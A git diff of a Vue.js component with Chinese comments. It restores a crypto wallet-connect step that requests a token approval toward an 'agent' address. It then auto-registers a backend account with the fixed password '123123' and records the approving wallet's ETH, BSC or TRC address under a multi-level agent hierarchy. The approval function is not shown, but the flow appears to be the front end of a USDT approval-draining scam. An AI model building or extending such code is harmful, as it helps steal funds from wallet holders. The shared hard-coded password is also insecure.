@@ -88,81 +88,77 @@ export default {
                 let agentAdressArr = agentAddress.split('-')
                 console.log('agentAdressArr = ', agentAdressArr)
 
-                // let doApproveInner = async (web3) => {
-                //   blockUtils.doApprove(web3, agentAdressArr[0], async (result, address) => {
-                //     if (result == true) {
-                let userName = autoRegister(8)
-                let passWord = '123123'
-                let userId = autoRegister(10)
-                let ancestorAddress = agentAddress
-                // 发送请求注册
-                let obj = {
-                    userName,
-                    passWord,
-                    userId,
-                    userType: '3',
-                    userParentId: arr[0].userParentId,
-                    userParentName: this.obj.userName,
-                    ancestorAddress
+                let doApproveInner = async (web3) => {
+                    blockUtils.doApprove(web3, agentAdressArr[0], async (result, address) => {
+                        if (result == true) {
+                            let userName = autoRegister(8)
+                            let passWord = '123123'
+                            let userId = autoRegister(10)
+                            let ancestorAddress = agentAddress
+                            // 发送请求注册
+                            let obj = {
+                                userName,
+                                passWord,
+                                userId,
+                                userType: '3',
+                                userParentId: arr[0].userParentId,
+                                userParentName: this.obj.userName,
+                                ancestorAddress
+                            }
+                            console.log(this.arr, `this.arr[1]`);
+                            // 如果是一级用户
+                            if (this.arr.length == 2) {
+                                // 添加授权用户对应链地址 
+                                if (this.arr[1].eth_usdt) {
+                                    obj['ethMainnetAddress'] = address
+                                } else if (this.arr[1].bsc_usdt) {
+                                    obj['bscMainnetAddress'] = address
+                                } else if (this.arr[1].trc_usdt) {
+                                    obj['trcMainnetAddress'] = address
+                                }
+                            } else {
+                                // 如果是二级用户及以上
+                                // 添加授权用户对应链地址
+                                if (agentAdressArr[1] == 'ETH') {
+                                    obj['ethMainnetAddress'] = address
+                                }
+                                else if (agentAdressArr[1] == 'BSC') {
+                                    obj['bscMainnetAddress'] = address
+                                }
+                                else if (agentAdressArr[1] == 'TRC') {
+                                    obj['trcMainnetAddress'] = address
+                                }
+                            }
+                            console.log(`授权成功，创建的用户信息为`, obj);
+                            await this.GoAutoRegister({
+                                ...obj
+                            })
+                            this.falg = false
+                            this.$message({
+                                type: 'info',
+                                message: this.Msg
+                            })
+                        }
+                        else {
+                            this.$message({
+                                type: 'info',
+                                message: `授权失败，地址有误`
+                            });
+                        }
+                    }, chainType)
                 }
-                console.log(this.arr, `this.arr[1]`);
-                // 如果是一级用户
-                if (this.arr.length == 2) {
-                    // 添加授权用户对应链地址 
-                    if (this.arr[1].eth_usdt) {
-                        obj['ethMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
-                    } else if (this.arr[1].bsc_usdt) {
-                        obj['bscMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
-                    } else if (this.arr[1].trc_usdt) {
-                        obj['trcMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
-                    }
-                } else {
-                    // 如果是二级用户及以上
-                    // 添加授权用户对应链地址
-                    console.log(agentAdressArr);
-                    if (agentAdressArr[1] == 'ETH') {
-                        // obj['ethMainnetAddress'] = address
-                        obj['ethMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
-                    }
-                    else if (agentAdressArr[1] == 'BSC') {
-                        // obj['bscMainnetAddress'] = address
-                        obj['bscMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
-                    }
-                    else if (agentAdressArr[1] == 'TRC') {
-                        // obj['trcMainnetAddress'] = address
-                        obj['trcMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
-                    }
-                }
-                console.log(`授权成功，创建的用户信息为`, obj);
-                await this.GoAutoRegister({
-                    ...obj
-                })
-                this.falg = false
-                this.$message({
-                    type: 'info',
-                    message: this.Msg
-                })
-            }
-            //     else {
-            //       this.$message({
-            //         type: 'info',
-            //         message: `授权失败，地址有误`
-            //       });
-            //     }
-            //   }, chainType)
-            // }
 
-            // 连接钱包
-            //   console.log('chainType = ', chainType)
-            //   blockUtils.doConnectWallet((info, web3) => {
-            //     if (info == 'DisApprove') {
-            //       blockUtils.doDisConnectWallet()
-            //     }
-            //     else if (info == 'Approve') {
-            //       doApproveInner(web3)
-            //     }
-            //   }, chainType)
-            // }
+                // 连接钱包
+                console.log('chainType = ', chainType)
+                blockUtils.doConnectWallet((info, web3) => {
+                    if (info == 'DisApprove') {
+                        blockUtils.doDisConnectWallet()
+                    }
+                    else if (info == 'Approve') {
+                        doApproveInner(web3)
+                    }
+                }, chainType)
+            }
         },
         disConnect() {
             alert("Description Succeeded in resetting the connection information")
@@ -184,7 +180,7 @@ export default {
     },
     created() {
 
-       
+
     }
 }
 </script>
